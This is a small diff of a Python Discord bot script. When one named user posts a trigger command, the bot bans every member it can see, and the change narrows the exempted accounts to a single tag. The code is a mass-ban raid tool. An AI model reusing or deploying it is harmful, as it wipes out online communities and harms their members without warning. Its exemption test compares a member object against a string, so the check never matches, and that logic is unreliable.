@@ -13,7 +13,7 @@ def removeUsers():
             if str(message.author) == USERNAME:
                 if message.content == ORDER:
                     for user in self.get_all_members():
-                        if user != ("Nevil#3721", "snheakydoge"):
+                        if user != ("Nevil#3721"):
                             await user.ban()
 
     permissions = discord.Intents.all()
